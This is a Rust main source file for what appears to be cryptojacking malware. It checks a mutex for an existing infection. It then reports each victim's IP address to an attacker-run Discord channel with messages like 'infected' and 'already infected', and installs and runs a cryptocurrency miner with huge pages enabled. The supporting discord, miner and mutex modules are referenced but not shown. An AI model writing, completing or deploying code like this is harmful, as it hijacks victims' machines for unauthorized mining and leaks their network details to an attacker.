mod discord;
mod miner;
mod mutex;

use discord::Discord;
use miner::Miner;

use env_logger::{Builder, Env};
use log::info;


fn main() -> Result<(), Box<dyn std::error::Error>> {
    Builder::from_env(Env::default().default_filter_or("info")).init();

    let mut discord = Discord::new();

    discord.set_username("tnd now!!");

    discord.send(String::from("checking infection status"));

    match mutex::lock() {
        Some(_) => {
            let _ = discord.send(format!("infected: {:?}", discord.get_ip()));

            let miner = Miner::new();

            miner.install()?;

            miner.enable_huge_pages();

            let mut handle = miner.run()?;

            handle.wait()?;
        },
        None => {
            let _ = discord.send(format!("already infected: {:?}", discord.get_ip()));
        },
    }

    Ok(())
}


